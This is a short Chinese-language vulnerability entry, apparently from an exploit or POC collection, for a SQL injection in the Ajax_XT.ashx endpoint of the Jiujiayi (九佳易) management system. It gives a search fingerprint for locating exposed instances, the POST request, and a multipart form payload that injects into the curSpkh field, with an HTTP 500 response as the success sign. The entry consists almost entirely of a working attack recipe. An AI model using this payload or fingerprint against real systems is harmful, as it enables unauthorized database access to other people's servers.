# 九佳易管理系统Ajax_XT.ashxSQL存在注入漏洞

九佳易管理系统Ajax_XT.ashxSQL ｜ SQL注入 ｜ —
- **指纹**：`body="/XiTong/Index/W_IndexPbForm.win.js"`
- **请求**：`POST /Service/Ajax_XT.ashx HTTP/1.1`

**Payload**
```
------WebKitFormBoundary
Content-Disposition: form-data; name="curFlag"
PicSord
------WebKitFormBoundary
Content-Disposition: form-data; name="curPxbh"
1,2
------WebKitFormBoundary
Content-Disposition: form-data; name="curSpkh"
'-1/user--
------WebKitFormBoundary--
```
- **响应特征**：500